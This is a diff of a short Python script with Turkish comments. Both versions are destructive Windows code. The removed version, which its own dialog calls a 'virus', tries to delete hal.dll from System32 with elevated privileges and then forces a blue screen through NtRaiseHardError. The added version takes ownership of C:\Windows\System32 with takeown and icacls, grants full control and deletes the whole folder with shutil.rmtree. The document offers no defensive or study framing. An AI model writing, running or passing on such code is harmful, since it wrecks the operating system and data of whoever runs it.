@@ -1,45 +1,29 @@
-import ctypes
-import sys
-import time
-from tkinter import messagebox
 import os
 import win32security
-import ntsecuritycon as con
 import win32file
+import win32con
+import shutil
 
-def trigger_blue_screen():
+def change_owner_and_delete_folder(folder_path):
     try:
-        # Windows API çağrısı ile mavi ekran tetikleme
-        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, None)
-        ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, 0)
-    except Exception:
-        sys.exit()
+        # Klasörün sahipliğini değiştir
+        sd = win32security.GetFileSecurity(folder_path, win32security.OWNER_SECURITY_INFORMATION)
+        admin_sid = win32security.LookupAccountName(None, "Administrators")[0]
+        sd.SetSecurityDescriptorOwner(admin_sid, False)
+        win32security.SetFileSecurity(folder_path, win32security.OWNER_SECURITY_INFORMATION, sd)
 
-def force_delete_file(file_path):
-    try:
-        # Yönetici hakları alma
-        hToken = win32security.OpenProcessToken(
-            win32security.GetCurrentProcess(), 
-            win32security.TOKEN_ALL_ACCESS
-        )
-        
-        # Ayrıcalık yükseltme
-        win32security.AdjustTokenPrivileges(
-            hToken,
-            False,
-            [(win32security.LookupPrivilegeValue(None, "SeBackupPrivilege"), con.SE_PRIVILEGE_ENABLED),
-             (win32security.LookupPrivilegeValue(None, "SeRestorePrivilege"), con.SE_PRIVILEGE_ENABLED)]
-        )
-        
-        # Dosyayı zorla silme
-        win32file.DeleteFile(file_path)
-        
+        # Alt klasörler ve dosyalar için sahipliği uygula
+        os.system(f'takeown /F "{folder_path}" /A /R /D Y')
+
+        # Yetkileri değiştir
+        os.system(f'icacls "{folder_path}" /grant %username%:F /T')
+
+        # Klasörü sil
+        shutil.rmtree(folder_path)
+        print(f"{folder_path} başarıyla silindi.")
     except Exception as e:
-        print(f"Sistem silinemedi: {e}")
+        print(f"Hata oluştu: {e}")
 
-if messagebox.askyesno("UYARI!", "Bu virüs çok tehlikeli olabilir. Başlatmak istediğinizden emin misiniz?"):
-    force_delete_file(r"C:\\Windows\\System32\\hal.dll")
-    time.sleep(2)
-    trigger_blue_screen()
-else:
-    sys.exit()
+# Kullanım
+folder_path = r"C:\\Windows\\System32"  # Silmek istediğiniz klasörün yolu
+change_owner_and_delete_folder(folder_path)
